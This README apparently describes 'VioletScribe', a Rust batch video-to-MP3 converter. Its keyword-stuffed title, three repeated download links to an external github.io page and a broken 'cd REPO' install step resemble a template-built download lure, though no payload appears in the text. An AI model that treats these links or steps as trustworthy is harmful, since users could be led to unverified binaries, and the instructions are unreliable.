# VioletScribe v2026 - batch video-to-MP3 converter 2026

> **VioletScribe is a Rust-powered batch video-to-MP3 utility for desktop and terminal use, combining a ratatui-driven interface with parallel FFmpeg execution to convert large video collections into audio efficiently in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-Rust%20CLI%20desktop-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/davisvictor20/violetscribe-rust-media-converter?style=flat-square)](https://github.com/davisvictor20/violetscribe-rust-media-converter)

---

<p align="center">
  <a href="https://davisvictor20.github.io/violetscribe-rust-media-converter/">
    <img src="https://img.shields.io/badge/Download-VioletScribe%20Latest-brightgreen?style=for-the-badge" alt="Download VioletScribe">
  </a>
</p>

> **[Direct Download - VioletScribe v2026](https://davisvictor20.github.io/violetscribe-rust-media-converter/)**

---

[Download Latest Build](https://davisvictor20.github.io/violetscribe-rust-media-converter/)

---

## What VioletScribe Does

VioletScribe is built for batch jobs where you want to turn many video files into MP3s without handling each conversion individually. It walks directory trees recursively, runs FFmpeg tasks in parallel, and keeps memory behavior stable so larger queues can be processed in a more predictable way.

That makes it a practical fit for transcription prep, audio extraction, and bulk media cleanup when you want a terminal-first workflow instead of a heavier application. The interface uses ratatui, giving it a compact command-line desktop style while still keeping the conversion process easy to follow.

---

## Capabilities

- Recursive directory scanning for nested video libraries
- Parallel FFmpeg conversion for faster batch output
- Up to 25 concurrent workers for high-throughput jobs
- Flat memory usage to keep processing behavior consistent
- Skips files that already have matching MP3 or SRT outputs
- Graceful shutdown support for interrupted sessions
- Plain text fallback for environments without the full TUI experience
- Single static binary for straightforward distribution and launch

---

## Installation

Clone the repository and build the project with Rust:

```bash
git clone https://github.com/davisvictor20/violetscribe-rust-media-converter.git
cd REPO
cargo build --release
```

After building, run the generated binary from the release target directory. If you are using a published build, download it and launch the executable directly.

---

## How to Use It

Give VioletScribe a folder that contains video files and it will inspect the directory tree for supported media. The application then queues conversion jobs, executes FFmpeg in parallel, and writes MP3 outputs next to the source content or into the destination you have configured.

Example workflow:

1. Start the program from the terminal.
2. Choose or provide a source directory.
3. Review the file list discovered by recursive scanning.
4. Begin batch conversion.
5. Let the worker pool process files until completion.

Typical command-line launch:

```bash
./violetscribe
```

If you are preparing files for transcription, run the conversion pass first and then feed the resulting MP3 files into your downstream workflow.

---

## Configuration

VioletScribe is centered around terminal use, so settings are typically managed through the app's runtime options and local preferences. If your build includes a configuration file, keep it near the executable or in the project-defined user settings location.

Example structure:

```toml
[conversion]
workers = 25
skip_existing = true
output_format = "mp3"

[interface]
mode = "tui"
fallback = "plain-text"
```

If a configuration file is not present in your build, use the available launch options and on-screen prompts to control the conversion flow.

---

## Requirements

- Rust toolchain for building from source
- FFmpeg available for audio conversion
- A desktop or terminal environment that can run a CLI application
- Enough storage for source videos and generated MP3 files
- A system capable of handling parallel jobs, especially for larger batches

---

## FAQ

**How do I update VioletScribe?**  
Download the latest build from the project release location or rebuild from the current source tree with Rust.

**Does it support large folder trees?**  
Yes. Recursive scanning is included, so nested directories can be processed in a single batch.

**What if I want to stop a run midway?**  
The tool includes graceful shutdown behavior so it can exit without requiring a hard termination.

**Can I avoid reprocessing files?**  
Yes. Existing MP3 or SRT outputs are skipped when detected.

**Is there a non-TUI fallback?**  
Yes. A plain text fallback is available for simpler terminal environments.

**Where do I change worker count or output behavior?**  
Adjust the runtime settings or configuration used by your build, depending on how the package is distributed.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
